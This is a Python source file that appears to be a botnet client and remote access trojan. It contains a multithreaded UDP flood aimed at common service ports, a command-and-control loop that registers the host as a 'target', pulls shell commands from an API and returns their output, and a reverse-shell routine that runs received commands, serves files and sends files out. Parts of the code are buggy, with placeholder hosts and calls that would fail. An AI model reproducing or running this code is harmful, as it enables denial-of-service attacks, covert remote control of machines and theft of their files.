from sys import platform
import socketserver
import http.server
import subprocess
import threading
import requests
import sqlite3
import logging
import string
import random
import socket
import time
import os

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

# os.system("clear")



# Shared Data for Tracking
packet_counts = {}  
lock = threading.Lock()  
stop_event = threading.Event()  

def send_udp_flood(thread_id, ports,TARGET_IP,PACKET_SIZE,FAKE_HEADERS,BASE_DELAY,ADAPTIVE_THRESHOLD,MIN_DELAY,MAX_DELAY):
    """UDP flood function for each thread."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    delay = BASE_DELAY  
    packet_count = 0  

    while not stop_event.is_set():  # Stop when the event is set
        for target_port in ports:  # Loop through all ports
            if stop_event.is_set():  
                break  # Stop immediately if the stop event is triggered

            message = random.choice(FAKE_HEADERS) + random._urandom(PACKET_SIZE - len(FAKE_HEADERS[0]))  

            try:
                sock.sendto(message, (TARGET_IP, target_port))
                packet_count += 1
            except Exception as e:
                print(f"[Thread {thread_id}] Error: {e}")
                break  

            # Update shared packet count
            with lock:
                packet_counts[thread_id] = packet_count  

            # Adaptive Rate Control
            if packet_count % ADAPTIVE_THRESHOLD == 0:
                delay = max(MIN_DELAY, min(MAX_DELAY, delay * random.uniform(0.8, 1.2)))  

            time.sleep(delay)  


# Command Interface
def command_interface(threads):
    while True:
        cmd = input("\nEnter command (status / stop): ").strip().lower()
        
        if cmd == "status":
            with lock:
                print("\n[Thread Status]")
                for tid, count in packet_counts.items():
                    print(f"Thread {tid}: {count} packets sent")
        
        elif cmd == "stop":
            print("\nStopping all threads...")
            stop_event.set()  
            for t in threads:
                t.join()  
            print("All threads stopped. Exiting.")
            break

# udp-flood(socket)
def udpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
    # deffult port
    ports = [
        21, # FTP
        22, # SSH
        23, # Telnet
        25, # SMTP
        53, # DNS(UDP)
        80, # HTTP
        110, # POP3
        123, # NTP(UDP)
        143, # IMAMP
        161, # SNMP(UDP)
        443, # HTTPS
        445, # SMB
        993, # IMAPS
        995, # POP3S
        3389, # RDP
        5060, # SIP(VoIP)
        8080, # Alternative HTTP
    ]

    # Adaptive Rate Control
    BASE_DELAY = 0.01  
    ADAPTIVE_THRESHOLD = 100  
    MIN_DELAY, MAX_DELAY = 0.05, 0.1  
    # Spoofed Protocol Data (Mimicking DNS/VoIP)
    FAKE_HEADERS = [
            b"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00",  # DNS-like query
            b"\x80\x00\x00\x00\x00\x01\x00\x00\x00\x00",  # VoIP RTP header
            b"\x00\x00\x00\x00\x00\x00\x00\x00",  # Generic header
        ]
    # Start Threads
    threads = []
    for i in range(THREAD_COUNT):  
        t = threading.Thread(target=send_udp_flood, args=(i, ports,TARGET_IP,PACKET_SIZE,FAKE_HEADERS,BASE_DELAY,ADAPTIVE_THRESHOLD,MIN_DELAY,MAX_DELAY), daemon=True)
        t.start()
        threads.append(t)
        packet_counts[i] = 0
    command_interface(threads)


# setting varible
apiToken = "sjfwjdflkjlkfjpasjf;df;jdlihalsdjflksdmljdlkndkljnsdkjvbskvkjsh"

logger = logging.getLogger(__name__)

def ID(n=5):
        """
        Generates a random alphanumeric ID of length 5. This ID can be used
        for creating unique identifiers for entities in the system, such as users,
        events, or records.

        Returns:
            str: A randomly generated 5-character string consisting of uppercase letters,
                 lowercase letters, and digits.
        """
        RandomID = ''.join(
            random.choices(
                string.ascii_uppercase + string.ascii_lowercase + string.digits, k=n
            )
        )
        return RandomID


def targetData(command, user_name=None, ID=None):
    conn = sqlite3.connect('info.db')
    cursour = conn.cursor()

    cursour.execute("""
        CREATE TABLE IF NOT EXISTS target_data(
            id TEXT PRIMAY KEY NOT NULL,
            target_name TEXT NOT NULL,
            is_registor text
        )
    """)

    if command == 'create_target' and user_name != None and ID != None:
        try:

            cursour.execute('INSERT INTO target_data(id, target_name,is_registor) VALUES(?,?,?)',(ID,user_name,'0'))
            conn.commit()
            return "Target was created succssefuly"
        
        except Exception as e:

            print(e)
            return "Something went wronge"
        
    elif command == "get":

        cursour.execute("SELECT * FROM target_data")
        data = cursour.fetchall()
        return data
    
    elif command == "update":

        cursour.execute("SELECT * FROM target_data")
        data = cursour.fetchall()
        cursour.execute('UPDATE target_data SET is_registor = ? AND target_name = ? WHERE id = ?',('1',user_name,data[0][0]))
        return 'updated!!!'


def CMD(com):

    try:

        cmd = subprocess.run(com, shell=True, capture_output=True, text=True)
        output_bytes = cmd.stderr + cmd.stdout
        output_string = str(output_bytes,'utf-8')
        cmd_data = output_string
        return cmd_data
    
    except Exception as e:

        return str(e)


def apiCommandGet(token,targrt_name):
    args = {"token": token}

    try:
        GET = requests.get(f'http://127.0.0.1:5000/api/ApiCommand/{targrt_name}',params=args)

    except:
        return 'Error'
    
    response = GET.json()
    valid = GET.status_code()

    if valid == 200:
        return response['allCommand']
    
    return 'invalid'
      

#3=cmd,target_name=2
def apiCommandPost(token,data,target_name):
    # data is all command recived from the api
    params= {
        'token': token,
        'target_name': target_name,
        'output': []
    }
    # cmd[0] is the id of the command
    for cmd in data:
        output = CMD(com=cmd[3])
        params['output'].append((cmd[0],output))
    
    POST = requests.post('http://127.0.0.1:5000/api/Apicommand/save_output',data=params)
    response = POST.json()
    valid = POST.status_code()

    if valid == 200:
        return response
    
    return 'Invalid'


def BotNet(target_name,apiToken):
    botNet = requests.get(f'http://127.0.0.1:5000/api/BotNet/{target_name}',params={'token':apiToken})

    if botNet.status_code == 200:

        if botNet.json()['message'] == 'good':

            udpflood = botNet.json()['udp-flood']
            bruteFroce = botNet.json()['brute-froce']
            customBotNet = botNet.json()['custom-BotNet']

            return udpflood,bruteFroce,customBotNet
    
        elif botNet.json()['message'] == 'bad':
            return 'empty'
        
    else:

        logger.info('[botNet Invalid]')
        return 'error'


def apiInfo(target_name, apiToken, command):
    info = {
        'token': apiToken,
        'target name': target_name
    }

    if command == 'registor':

        try:
            POST = requests.post(f"http://127.0.0.1:5000/api/registor_target",data=info)
            
            if POST.status_code() == 200:
                targetData(command='update',user_name=POST.json()['target_name'])
                return POST.json()
        except:
            return 'error'

    elif command == 'get':

        try:

            GET = requests.get(f"http://127.0.0.1:5000/api/get_instraction/{target_name}",params=info)
            instraction = GET.json()

            return instraction
        
        except:
            return 'error'
        
    return 'unkown command'


def apiMain():
    
    while True:

        target_info = targetData(command='get')

        if len(target_info) != 0:

            target_name = target_info[0][1]
            instraction = apiInfo(target_name=target_name,apiToken=apiToken,command='get')

            if instraction != 'error':

                delay = int(instraction['delay'])

                if instraction['instraction'] == 'connectToWeb':

                    cmd = apiCommandGet(targrt_name=target_name,token=apiToken)
                    result = apiCommandPost(token=apiToken,target_name=target_name,data=cmd)

                    if result == 'Invalid':

                        logger.info(f'[apiCommandpost Invalid] {result}')

                elif instraction['instraction'] == 'botNet':

                    botNet = BotNet(target_name=target_name,apiToken=apiToken)

                    if  botNet != 'error' or botNet != 'no instraction yet':
                        
                        udpflood,bruteFroce,customBotNet = botNet

                        if 'stop' != udpflood:
                            udpflood()
                        elif 'stop' != bruteFroce:
                            ...
                        elif 'stop' != customBotNet:
                            ...
                        else:
                            logger.info('[botNet Invalid]')
                    
                    return 

                else:
                    break
            else:
                logger.info(f'[apiCommandpost Error] {result}')
                break

        else:
            user_name=ID(n=10)
            data = apiInfo(target_name=user_name,apiToken=apiToken,command='registor')

            if data != 'error':
                registor_target = targetData(command='create_target',ID=ID(n=5),user_name=data['name'])
                if registor_target == "Target was created succssefuly":
                    logger.info()
        time.sleep(delay)


def get_host_port(s1):

    for i in range(0,len(s1)):
        if s1[i] == ":":
            IP = s1[:i]
            PORT = s1[i+1:]

    return IP,PORT

def dir_chacker(_pwd):

    cmd = subprocess.Popen(_pwd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    bytes = cmd.stdout.read() + cmd.stderr.read()
    string = str(bytes)
    pwd = string[2:-3]
    ch_point = []

    for x in range(len(pwd)):
        if pwd[x] == "/":
            ch_point.append(x)
    
    f = ch_point[-1] + 1
    ch_point.clear()
    return pwd[f:]
    
    
def server_target(IP, PORT):

    #creating request handler with variable name handler
    handler = http.server.SimpleHTTPRequestHandler
    #binding the request with the ip and port as httpd
    with socketserver.TCPServer((IP, int(PORT)), handler) as httpd:
        messeage = YELLOW+"Server started at  -> "+IP+":"+PORT+END
        #running the server
        httpd.serve_forever()
            
def send(com,_port):
        
        _s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = socket.gethostname()

        try:
            print(_port)
            _s.connect((host,_port))
        except Exception as e:
            pass
        try:
            file_size = str(os.path.getsize(com))
            _s.send(str.encode(file_size))
        
            with open(com,"rb") as files:

                while True:
                    data = files.read(1024)
                    if not (data):
                        break
                    _s.send(data)
        except:
            _s.close()

def main():
    # creating tcp socket as "s"
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    # get the ip address of current hosting machine
    # host = socket.gethostname()
    # port = 55554
    try:
        port,host = 0,0 # api_host_geter()
        time.sleep(1)
        # trying to connect to the given host and port    
        s.connect((host,port))
        if platform == "win32":
            _pwd = "echo %cd%"
        else:
            _pwd = "pwd"
        pwd = dir_chacker(_pwd)
        s.send(str.encode(pwd))
        while True:

            # storing the receiving data in a variable name "data"
            data = s.recv(1024)
            # checking if the receiving data contains the word "exit" or "quite" if so brack the  loop and exit
            if data.decode("utf-8") == 'exit' or data.decode("utf-8") == "quite":
                break
            # checking if the user trying to change dir
            elif data[:2].decode("utf-8") == "cd":
                d = str(data[3:].decode("utf-8"))
        
                try:
                    os.chdir(d)
                    pwd = dir_chacker(_pwd)
                    msg = "-pwd@-"+pwd  
                except:
                    msg = RED+"\n[!][!] Oops! there is no such a directory :p!!:-> "+d+END
                s.send(str.encode(msg))
            elif data[:6].decode("utf-8") == "server":
                s1 = data[7:].decode("utf-8")
                IP , PORT = get_host_port(s1)
                message =  GREEN + "sever is runnig on : "+END+MAGENTA+IP+":"+PORT+END
                t = threading.Thread(target = server_target ,args = (IP,PORT))
                t.start()
                s.send(str.encode(message))
        
            elif data[:8].decode("utf-8") == "download":
                com = data[9:].decode("utf-8")
                #print("hi")
                _port = port - 1
                send(com,_port)

            # checking if the receiv data not null(not empty)
            elif len(data) > 0:
                if data[:2].decode("utf-8") == "ls":
                    data = "ls --color "+str(data[3:].decode("utf-8"))
                    cmd = subprocess.Popen(data ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_string = str(output_bytes, "utf-8")
                else:
                    cmd = subprocess.Popen(data.decode("utf-8") ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_string = str(output_bytes, "utf-8")
                    # checking if the output of the receive data is null(empty)
                    if len(output_string) == 0:
                        output_string = GREEN+"[   "+END+YELLOW+">_<"+END+GREEN+"   [DONE!!!]"+ "  ]"+END
                s.send(str.encode(output_string))
    except: 
        pass
    s.close()

